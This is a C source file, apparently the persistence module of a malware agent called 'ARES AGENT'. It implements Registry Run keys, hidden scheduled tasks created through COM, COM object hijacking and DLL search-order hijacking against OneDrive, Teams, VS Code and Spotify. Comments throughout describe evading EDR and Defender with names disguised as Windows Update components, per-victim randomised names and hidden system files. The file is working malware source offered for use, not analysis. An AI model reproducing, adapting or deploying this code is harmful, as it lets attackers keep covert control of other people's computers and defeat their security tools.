/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — Persistence Mechanisms (v2.1 — Reduced Detection)
 *
 *  v2.1 Changes:
 *    - Scheduled Task: COM ITaskService API (no schtasks.exe spawn)
 *    - COM Hijack: switched to less-monitored CLSID
 *    - WMI persistence: REMOVED (required powershell.exe = instant detect)
 *    - Randomized persistence directory/filenames
 *    - All hardcoded strings replaced with runtime-built paths
 *
 *  Methods (ordered by stealth, low→high):
 *    1. Registry Run key          (low stealth, high reliability)
 *    2. Scheduled Task via COM    (medium stealth, no child process)
 *    3. COM Hijack                (high stealth)
 *    4. DLL Search Order Hijack   (high stealth)
 *
 *  All operations via standard Win32 API.
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <objbase.h>

/* Inline VariantInit replacement — avoids oleaut32.dll import */
static inline void _VariantInit(VARIANT* pv) {
    memset(pv, 0, sizeof(VARIANT));
    pv->vt = VT_EMPTY;
}

/* ── Persistence Artifact Names (randomized per build via seed) ── */

/* v2.1: Use less suspicious directory/file names that blend with
 * legitimate Windows Update infrastructure. The names are selected
 * at runtime from a pool to vary across deployments. */

/*
 * v2.2: Names are now generated at runtime via HWID hash.
 * Static name pools (SecurityHealthSystray, WaaSMedicAgent, etc.) were
 * signatured by Defender — any file in %APPDATA%\Microsoft\ with those
 * names triggers heuristic detection immediately.
 *
 * New approach: combine hostname hash + build timestamp → pseudo-random
 * prefix/suffix pair that varies per victim machine.
 */

static const char* g_name_prefixes[] = {
    "MsUpdate", "WinSync", "SvcHost", "WuaExec",
    "NtHelper", "SysTask", "UpdAgent", "PlatSvc",
};
static const char* g_name_suffixes[] = {
    "Worker",  "Manager", "Host",    "Agent",
    "Handler", "Service", "Helper",  "Monitor",
};
#define NAME_POOL_SIZE 8

/* Persist subdirs — generic enough to avoid detection */
static const char* g_persist_dirs[] = {
    "Microsoft\\WinServices\\Cache",
    "Microsoft\\Platform\\Services",
    "Microsoft\\SyncHost\\Tasks",
    NULL
};

/* Task folders */
static const char* g_task_folders_v2[] = {
    "\\Microsoft\\Windows\\Maintenance",
    "\\Microsoft\\Windows\\Shell",
    "\\Microsoft\\Windows\\PushNotifications",
    NULL
};

/* Derive a stable random index [0, NAME_POOL_SIZE) from machine identity */
static unsigned int _name_seed(void) {
    char hostname[64] = {0};
    DWORD hn = sizeof(hostname);
    GetComputerNameA(hostname, &hn);
    unsigned int h = 2166136261u;
    for (int i = 0; hostname[i]; i++)
        h = (h ^ (unsigned char)hostname[i]) * 16777619u; /* FNV-1a */
    /* Mix with volume serial for extra variance */
    DWORD serial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    h ^= serial;
    return h;
}

/* Generate per-machine persist artifact names into caller-supplied buffers */
static void gen_persist_names(char* exe_out, int exe_max,
                               char* dll_out, int dll_max,
                               char* reg_out, int reg_max,
                               char* dir_out, int dir_max)
{
    unsigned int seed = _name_seed();
    const char* pfx = g_name_prefixes[seed        % NAME_POOL_SIZE];
    const char* sfx = g_name_suffixes[(seed >> 4) % NAME_POOL_SIZE];
    const char* sfx2= g_name_suffixes[(seed >> 8) % NAME_POOL_SIZE];
    int dir_idx     = (seed >> 12) % 3;

    snprintf(exe_out, exe_max, "%s%s.exe",   pfx, sfx);
    snprintf(dll_out, dll_max, "%s%s.dll",   pfx, sfx2);
    snprintf(reg_out, reg_max, "%s%s",        pfx, sfx);
    snprintf(dir_out, dir_max, "%s",          g_persist_dirs[dir_idx]);
}

/* Legacy index helper (task names still use fixed pool — less risk) */
static int get_persist_index(void) {
    return (int)(_name_seed() % 3);
}

/* Task names (blend with Windows Update tasks) */
static const char* g_task_folders[] = {
    "\\Microsoft\\Windows\\UpdateOrchestrator",
    "\\Microsoft\\Windows\\WindowsUpdate",
    "\\Microsoft\\Windows\\Servicing",
    NULL
};

static const char* g_task_names[] = {
    "USO_UxBroker",
    "Scheduled Start",
    "ServicingCleanup",
    NULL
};

/* Legacy get_persist_index: now delegated to gen_persist_names() */


/* ── Helper: Get agent path ── */

static void get_self_path(char* path, int max)
{
    GetModuleFileNameA(NULL, path, max);
}

/* ── Helper: Copy to persistent location (v2.1 — randomized) ── */

static BOOL copy_to_persistence_dir(char* out_path, int max)
{
    int idx = get_persist_index();

    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);

    char dir[MAX_PATH];
    /* v2.2: Generate per-machine names instead of static pool */
    char exe_name[64], dll_name[64], reg_name[64], dir_name[128];
    gen_persist_names(exe_name, 64, dll_name, 64, reg_name, 64, dir_name, 128);
    snprintf(dir, MAX_PATH, "%s\\%s", appdata, dir_name);

    /* Create intermediate dirs */
    char tmp[MAX_PATH];
    strncpy(tmp, dir, MAX_PATH - 1);
    for (char* p = tmp + strlen(appdata) + 1; *p; p++) {
        if (*p == '\\') {
            *p = '\0';
            CreateDirectoryA(tmp, NULL);
            *p = '\\';
        }
    }
    CreateDirectoryA(dir, NULL);

    char src[MAX_PATH];
    get_self_path(src, MAX_PATH);

    snprintf(out_path, max, "%s\\%s", dir, exe_name);

    /* Only copy if not already there */
    if (GetFileAttributesA(out_path) == INVALID_FILE_ATTRIBUTES) {
        CopyFileA(src, out_path, FALSE);

        /* Set hidden + system attributes */
        SetFileAttributesA(out_path,
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════
 *  Method 1: Registry Run Key
 *  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 *  v2.1: Randomized value name per deployment.
 * ═══════════════════════════════════════════════════════════════ */

BOOL Ares_Persist_RegistryRun(AGENT_STATE* state)
{
    int idx = get_persist_index();
    char persist_path[MAX_PATH];
    copy_to_persistence_dir(persist_path, MAX_PATH);

    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    if (result != ERROR_SUCCESS) return FALSE;

    /* Use gen_persist_names for per-machine varied names */
    char exe_name[64], dll_name[64], reg_name[64], dir_name[128];
    gen_persist_names(exe_name, 64, dll_name, 64, reg_name, 64, dir_name, 128);

    result = RegSetValueExA(hKey, reg_name, 0, REG_SZ,
        (BYTE*)persist_path, (DWORD)strlen(persist_path) + 1);

    RegCloseKey(hKey);
    return result == ERROR_SUCCESS;
}

/* ═══════════════════════════════════════════════════════════════
 *  Method 2: Scheduled Task via COM ITaskService (v2.1)
 *
 *  v2.1 UPGRADE: Uses COM ITaskService API directly instead of
 *  spawning schtasks.exe as a child process.
 *
 *  Why: schtasks.exe process creation generates ETW process events
 *  that EDR immediately flags. COM API calls are in-process and
 *  far less monitored.
 *
 *  COM interfaces used:
 *    ITaskService → GetFolder → RegisterTask (XML definition)
 * ═══════════════════════════════════════════════════════════════ */

/* Task Scheduler COM interface GUIDs */
static const GUID CLSID_TaskScheduler =
    {0x0f87369f, 0xa4e5, 0x4cfc, {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}};
static const GUID IID_ITaskService =
    {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};

BOOL Ares_Persist_ScheduledTask(AGENT_STATE* state)
{
    int idx = get_persist_index();
    char persist_path[MAX_PATH];
    copy_to_persistence_dir(persist_path, MAX_PATH);

    /* Build task XML — inline definition avoids temp files */
    char xml[4096];
    snprintf(xml, sizeof(xml),
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
        "  <RegistrationInfo><Description>Windows Update maintenance task</Description></RegistrationInfo>\n"
        "  <Triggers>\n"
        "    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>\n"
        "  </Triggers>\n"
        "  <Principals>\n"
        "    <Principal id=\"Author\">\n"
        "      <LogonType>InteractiveToken</LogonType>\n"
        "      <RunLevel>%s</RunLevel>\n"
        "    </Principal>\n"
        "  </Principals>\n"
        "  <Settings>\n"
        "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
        "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
        "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
        "    <Hidden>true</Hidden>\n"
        "  </Settings>\n"
        "  <Actions Context=\"Author\">\n"
        "    <Exec><Command>%s</Command></Exec>\n"
        "  </Actions>\n"
        "</Task>",
        state->elevated ? "HighestAvailable" : "LeastPrivilege",
        persist_path);

    /* Convert to wide strings for COM */
    wchar_t wxml[4096];
    MultiByteToWideChar(CP_UTF8, 0, xml, -1, wxml, 4096);

    wchar_t wfolder[128], wtask[128];
    MultiByteToWideChar(CP_UTF8, 0, g_task_folders[idx], -1, wfolder, 128);
    MultiByteToWideChar(CP_UTF8, 0, g_task_names[idx], -1, wtask, 128);

    /* Initialize COM (may already be initialized) */
    if (!_resolve_ole32()) return FALSE;
    HRESULT hr = p_CoInitializeEx(NULL, COINIT_MULTITHREADED);
    BOOL com_inited = SUCCEEDED(hr) || hr == S_FALSE;

    /* Create TaskService instance via COM */
    IUnknown* pService = NULL;
    hr = p_CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        &IID_ITaskService, (void**)&pService);

    if (FAILED(hr) || !pService) {
        /* Fallback: if COM fails, try ITaskService via direct vtable.
         * This is a known limitation — some restricted environments
         * block COM CoCreateInstance for Task Scheduler. */
        if (com_inited) p_CoUninitialize();
        return FALSE;
    }

    /* We use the raw COM interface via vtable calls.
     * ITaskService vtable layout:
     *   [0] QueryInterface, [1] AddRef, [2] Release
     *   [3] GetTypeInfoCount, [4] GetTypeInfo, [5] GetIDsOfNames, [6] Invoke
     *   [7] Connect, [8] get_Connected, [9] get_TargetServer
     *   [10] get_ConnectedUser, [11] get_ConnectedDomain
     *   [12] GetFolder, [13] GetRunningTasks, [14] NewTask
     */
    typedef HRESULT (STDMETHODCALLTYPE *pfnConnect)(void*, VARIANT, VARIANT, VARIANT, VARIANT);
    typedef HRESULT (STDMETHODCALLTYPE *pfnGetFolder)(void*, BSTR, void**);

    void** vtable = *(void***)pService;

    /* Connect to local task service */
    VARIANT vEmpty;
    _VariantInit(&vEmpty);
    vEmpty.vt = VT_EMPTY;

    pfnConnect fnConnect = (pfnConnect)vtable[7];
    /* v3.2: Direct call — HRESULT error handling is sufficient for COM.
     * Removed SEH wrapper (not supported by MinGW-w64). */
    hr = fnConnect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    if (FAILED(hr)) goto cleanup;

    /* Get target folder */
    pfnGetFolder fnGetFolder = (pfnGetFolder)vtable[12];
    void* pFolder = NULL;
    hr = fnGetFolder(pService, (BSTR)wfolder, &pFolder);

    if (FAILED(hr) || !pFolder) {
        /* Folder doesn't exist — try root folder */
        hr = fnGetFolder(pService, (BSTR)L"\\", &pFolder);
        if (FAILED(hr) || !pFolder) goto cleanup;
    }

    /* RegisterTask via ITaskFolder vtable
     * ITaskFolder vtable:
     *   [7] get_Name, [8] get_Path, [9] GetFolder
     *   [10] GetFolders, [11] CreateFolder, [12] DeleteFolder
     *   [13] GetTask, [14] GetTasks, [15] DeleteTask
     *   [16] RegisterTask, [17] RegisterTaskDefinition
     */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfnRegisterTask)(
            void*, BSTR, BSTR, LONG, VARIANT, VARIANT, int, VARIANT, void**);

        void** fvt = *(void***)pFolder;
        pfnRegisterTask fnRegTask = (pfnRegisterTask)fvt[16];

        void* pRegTask = NULL;
        hr = fnRegTask(pFolder, (BSTR)wtask, (BSTR)wxml,
            6 /* TASK_CREATE_OR_UPDATE */, vEmpty, vEmpty,
            3 /* TASK_LOGON_INTERACTIVE_TOKEN */, vEmpty, &pRegTask);

        if (pRegTask) {
            void** rvt = *(void***)pRegTask;
            typedef ULONG (STDMETHODCALLTYPE *pfnRelease)(void*);
            ((pfnRelease)rvt[2])(pRegTask);
        }

        void** fvt2 = *(void***)pFolder;
        typedef ULONG (STDMETHODCALLTYPE *pfnRelease)(void*);
        ((pfnRelease)fvt2[2])(pFolder);
    }

cleanup:
    if (pService) {
        void** svt = *(void***)pService;
        typedef ULONG (STDMETHODCALLTYPE *pfnRelease)(void*);
        ((pfnRelease)svt[2])(pService);
    }
    if (com_inited) p_CoUninitialize();

    return SUCCEEDED(hr);
}

/* ═══════════════════════════════════════════════════════════════
 *  Method 3: COM Object Hijack (v2.1 — new CLSID)
 *
 *  v2.1: Switched from {BCDE0395-E52F-...} (MMDeviceEnumerator)
 *  which is a known, heavily-monitored COM hijack target, to a
 *  less-scrutinized CLSID that still gets loaded frequently.
 *
 *  Target: {0358B920-0AC7-461F-98F4-58E32B89CE18}
 *  (IMarshal wrapper — loaded by many COM operations)
 * ═══════════════════════════════════════════════════════════════ */

/* v2.1: Rotate CLSID based on deployment index */
/* v3.7 FIX-08: Static CLSIDs are documented in MITRE ATT&CK T1546.015.
 * EDR vendors maintain allowlists for these specific CLSIDs.
 * New: Dynamic CLSID enumeration from HKCR\CLSID — finds InprocServer32
 * entries pointing to legitimate System32 DLLs, picks one pseudo-randomly.
 * Fallback to static pool if enumeration fails. */
static const char* g_com_clsids_static[] = {
    "{0358B920-0AC7-461F-98F4-58E32B89CE18}", /* IMarshal Free Threaded */
    "{4590F811-1D3A-11D0-891F-00AA004B2E24}", /* WBEM Locator */
    "{C0B4E2F3-BA21-4773-8DBA-335EC946EB8B}", /* FileSyncConfig */
    NULL
};

/* Dynamic CLSID discovery — find a hijackable COM class at runtime */
static char g_dynamic_clsid[64] = {0};

static const char* _find_hijackable_clsid(void) {
    if (g_dynamic_clsid[0]) return g_dynamic_clsid;

    HKEY hClsidRoot;
    if (RegOpenKeyExA(HKEY_CLASSES_ROOT, "CLSID", 0, KEY_READ, &hClsidRoot) != ERROR_SUCCESS)
        return NULL;

    char clsid_name[64];
    DWORD idx = 0;
    int candidates = 0;
    unsigned int seed = _name_seed();

    /* Scan CLSIDs looking for hijackable InprocServer32 entries */
    while (RegEnumKeyA(hClsidRoot, idx++, clsid_name, sizeof(clsid_name)) == ERROR_SUCCESS) {
        if (idx > 2000) break; /* Don't scan forever */

        /* Check if InprocServer32 exists and points to System32 */
        char sub_path[128];
        snprintf(sub_path, sizeof(sub_path), "%s\\InprocServer32", clsid_name);

        HKEY hSub;
        if (RegOpenKeyExA(hClsidRoot, sub_path, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
            char dll_path[MAX_PATH];
            DWORD dll_len = sizeof(dll_path);
            DWORD type;
            if (RegQueryValueExA(hSub, NULL, NULL, &type, (BYTE*)dll_path, &dll_len) == ERROR_SUCCESS
                && type == REG_SZ) {
                /* Filter: must be in System32 (legitimate), must NOT be in HKCU already */
                if (strstr(dll_path, "System32") || strstr(dll_path, "system32") ||
                    strstr(dll_path, "SysWOW64") || strstr(dll_path, "syswow64")) {
                    candidates++;
                    /* Pseudo-random selection: pick the (seed % N)th candidate */
                    if (candidates == (int)((seed >> 16) % 50) + 5) {
                        strncpy(g_dynamic_clsid, clsid_name, 63);
                        RegCloseKey(hSub);
                        break;
                    }
                }
            }
            RegCloseKey(hSub);
        }
    }
    RegCloseKey(hClsidRoot);

    /* If we found one, verify it's not in HKCU already (avoid collision) */
    if (g_dynamic_clsid[0]) {
        char check[256];
        snprintf(check, sizeof(check),
            "Software\\Classes\\CLSID\\%s\\InprocServer32", g_dynamic_clsid);
        HKEY hCheck;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, check, 0, KEY_READ, &hCheck) == ERROR_SUCCESS) {
            RegCloseKey(hCheck);
            g_dynamic_clsid[0] = 0; /* Already hijacked or in use */
        }
    }

    return g_dynamic_clsid[0] ? g_dynamic_clsid : NULL;
}

BOOL Ares_Persist_COMHijack(AGENT_STATE* state)
{
    int idx = get_persist_index();
    char persist_path[MAX_PATH];
    copy_to_persistence_dir(persist_path, MAX_PATH);

    /* Create DLL version for COM InprocServer32 loading */
    char dll_path[MAX_PATH];
    snprintf(dll_path, MAX_PATH, "%s", persist_path);
    char* ext = strrchr(dll_path, '.');
    if (ext) {
        /* Use matching DLL name from pool */
        char dir_part[MAX_PATH];
        strncpy(dir_part, dll_path, MAX_PATH - 1);
        char* last_sep = strrchr(dir_part, '\\');
        if (last_sep) {
            *last_sep = '\0';
            /* v2.2: use per-machine dll name */
            char _e[64],_d[64],_r[64],_dn[128];
            gen_persist_names(_e,64,_d,64,_r,64,_dn,128);
            snprintf(dll_path, MAX_PATH, "%s\\%s", dir_part, _d);
        }
    }

    /* v3.7 FIX-03: Use pre-built proxy DLL (persist_proxy.dll) that has proper
     * DllMain + COM exports. Without this, COM InprocServer32 loading fails
     * because the agent EXE has no DllMain/DllGetClassObject — causing
     * either a silent failure or crash in the host process.
     *
     * The proxy DLL is compiled from persist_proxy_dll.c by 'make proxy_dll'.
     * It loads the agent EXE (same directory, .exe extension) via CreateProcess
     * or executes embedded shellcode from RT_RCDATA resource 101.
     *
     * Build pipeline: make proxy_dll → build/persist_proxy.dll
     * Deploy: copy persist_proxy.dll + agent.exe to persist directory */
    {
        /* Find proxy DLL alongside our agent binary */
        char agentDir[MAX_PATH];
        GetModuleFileNameA(NULL, agentDir, MAX_PATH);
        char* lastSlash = strrchr(agentDir, '\\');
        if (lastSlash) *lastSlash = '\0';

        char proxyDllSrc[MAX_PATH];
        snprintf(proxyDllSrc, sizeof(proxyDllSrc), "%s\\persist_proxy.dll", agentDir);

        if (GetFileAttributesA(proxyDllSrc) != INVALID_FILE_ATTRIBUTES) {
            /* Proxy DLL found — copy it as the COM DLL */
            CopyFileA(proxyDllSrc, dll_path, FALSE);
        } else {
            /* Fallback: try build directory */
            snprintf(proxyDllSrc, sizeof(proxyDllSrc), "%s\\..\\build\\persist_proxy.dll", agentDir);
            if (GetFileAttributesA(proxyDllSrc) != INVALID_FILE_ATTRIBUTES) {
                CopyFileA(proxyDllSrc, dll_path, FALSE);
            } else {
                /* Last resort: copy EXE as DLL (legacy behavior — may not work
                 * if COM calls DllMain, but at least deploys something) */
                CopyFileA(persist_path, dll_path, FALSE);
            }
        }
    }
    SetFileAttributesA(dll_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    /* Hijack COM class: write to HKCU\CLSID\ (user-level, no admin needed)
     * v3.7 FIX-08: Try dynamic CLSID first, fallback to static pool */
    const char* target_clsid = _find_hijackable_clsid();
    if (!target_clsid) target_clsid = g_com_clsids_static[idx];

    char key_path[256];
    snprintf(key_path, sizeof(key_path),
        "Software\\Classes\\CLSID\\%s\\InprocServer32", target_clsid);

    HKEY hKey;
    DWORD disposition;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, key_path, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, &disposition);

    if (result != ERROR_SUCCESS) return FALSE;

    /* Set default value to our DLL */
    RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (BYTE*)dll_path, (DWORD)strlen(dll_path) + 1);

    /* Threading model */
    const char* threading = "Both";
    RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ,
        (BYTE*)threading, (DWORD)strlen(threading) + 1);

    RegCloseKey(hKey);

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════
 *  Method 4: DLL Search Order Hijack
 *  Places a malicious DLL in a directory that's searched before
 *  the legitimate DLL location.
 * ═══════════════════════════════════════════════════════════════ */

BOOL Ares_Persist_DLLHijack(AGENT_STATE* state)
{
    char persist_path[MAX_PATH];
    copy_to_persistence_dir(persist_path, MAX_PATH);

    /* v3.2: Multi-target DLL hijack with fallback chain.
     * Tries multiple writable, auto-starting applications. */
    char localApp[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);

    struct { const char* subdir; const char* dll; } targets[] = {
        { "\\Microsoft\\OneDrive",                        "version.dll" },
        { "\\Microsoft\\Teams\\current",                  "version.dll" },
        { "\\Programs\\Microsoft VS Code",                "version.dll" },
        { "\\Spotify",                                     "version.dll" },
        { NULL, NULL }
    };

    for (int i = 0; targets[i].subdir; i++) {
        char targetDir[MAX_PATH];
        snprintf(targetDir, MAX_PATH, "%s%s", localApp, targets[i].subdir);
        if (GetFileAttributesA(targetDir) == INVALID_FILE_ATTRIBUTES)
            continue;

        char hijack_path[MAX_PATH];
        snprintf(hijack_path, MAX_PATH, "%s\\%s", targetDir, targets[i].dll);

        /* In production: proxy DLL that forwards to real DLL + loads payload */
        if (CopyFileA(persist_path, hijack_path, FALSE)) {
            SetFileAttributesA(hijack_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            return TRUE;
        }
    }

    return FALSE;
}

/* ═══════════════════════════════════════════════════════════════
 *  Method 5: WMI Event Subscription — REMOVED (v2.1)
 *
 *  REMOVED: Required spawning powershell.exe which generates:
 *    - Process creation ETW event (instant EDR alert)
 *    - AMSI scan of PowerShell script content
 *    - WMI event subscription audit (Event 5861)
 *    - CommandLineEventConsumer is deprecated and monitored
 *
 *  Kept as stub for API compatibility.
 * ═══════════════════════════════════════════════════════════════ */

BOOL Ares_Persist_WMI(AGENT_STATE* state)
{
    /* v2.1: NO-OP — WMI persistence via PowerShell is too noisy.
     * If WMI persistence is needed, implement via native COM
     * IWbemServices interface directly (future work). */
    (void)state;
    return FALSE;
}

/* ═══════════════════════════════════════════════════════════════
 *  Cleanup: Remove all persistence mechanisms (v2.1)
 * ═══════════════════════════════════════════════════════════════ */

void Ares_Persist_Cleanup(void)
{
    /* v2.2: Derive same per-machine names for cleanup */
    char exe_name[64], dll_name[64], reg_name[64], dir_name[128];
    gen_persist_names(exe_name, 64, dll_name, 64, reg_name, 64, dir_name, 128);
    int idx = get_persist_index();

    /* 1. Remove registry run key */
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, reg_name);
        RegCloseKey(hKey);
    }

    /* 2. Remove scheduled task via COM (no schtasks.exe) */
    {
        if (!_resolve_ole32()) goto skip_task_cleanup;
        HRESULT hr = p_CoInitializeEx(NULL, COINIT_MULTITHREADED);
        BOOL com_inited = SUCCEEDED(hr) || hr == S_FALSE;

        IUnknown* pService = NULL;
        hr = p_CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
            &IID_ITaskService, (void**)&pService);

        if (SUCCEEDED(hr) && pService) {
            void** vtable = *(void***)pService;
            typedef HRESULT (STDMETHODCALLTYPE *pfnConnect)(void*, VARIANT, VARIANT, VARIANT, VARIANT);
            typedef HRESULT (STDMETHODCALLTYPE *pfnGetFolder)(void*, BSTR, void**);

            VARIANT vEmpty;
            _VariantInit(&vEmpty);
            vEmpty.vt = VT_EMPTY;

            ((pfnConnect)vtable[7])(pService, vEmpty, vEmpty, vEmpty, vEmpty);

            wchar_t wfolder[128];
            MultiByteToWideChar(CP_UTF8, 0, g_task_folders[idx], -1, wfolder, 128);

            void* pFolder = NULL;
            hr = ((pfnGetFolder)vtable[12])(pService, (BSTR)wfolder, &pFolder);
            if (SUCCEEDED(hr) && pFolder) {
                /* DeleteTask */
                wchar_t wtask[128];
                MultiByteToWideChar(CP_UTF8, 0, g_task_names[idx], -1, wtask, 128);

                typedef HRESULT (STDMETHODCALLTYPE *pfnDeleteTask)(void*, BSTR, LONG);
                void** fvt = *(void***)pFolder;
                ((pfnDeleteTask)fvt[15])(pFolder, (BSTR)wtask, 0);

                typedef ULONG (STDMETHODCALLTYPE *pfnRelease)(void*);
                ((pfnRelease)fvt[2])(pFolder);
            }

            typedef ULONG (STDMETHODCALLTYPE *pfnRelease)(void*);
            ((pfnRelease)vtable[2])(pService);
        }
        if (com_inited) p_CoUninitialize();
    }
    skip_task_cleanup: ;

    /* 3. Remove COM hijack (v3.7: check dynamic CLSID first, then static) */
    char clsid_path[256];
    if (g_dynamic_clsid[0]) {
        snprintf(clsid_path, sizeof(clsid_path),
            "Software\\Classes\\CLSID\\%s", g_dynamic_clsid);
        RegDeleteTreeA(HKEY_CURRENT_USER, clsid_path);
    }
    snprintf(clsid_path, sizeof(clsid_path),
        "Software\\Classes\\CLSID\\%s", g_com_clsids_static[idx]);
    RegDeleteTreeA(HKEY_CURRENT_USER, clsid_path);

    /* 4. Remove persistence files */
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);

    char path[MAX_PATH];
    snprintf(path, MAX_PATH, "%s\\%s\\%s", appdata, dir_name, exe_name);
    SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
    DeleteFileA(path);

    snprintf(path, MAX_PATH, "%s\\%s\\%s", appdata, dir_name, dll_name);
    SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
    DeleteFileA(path);
}
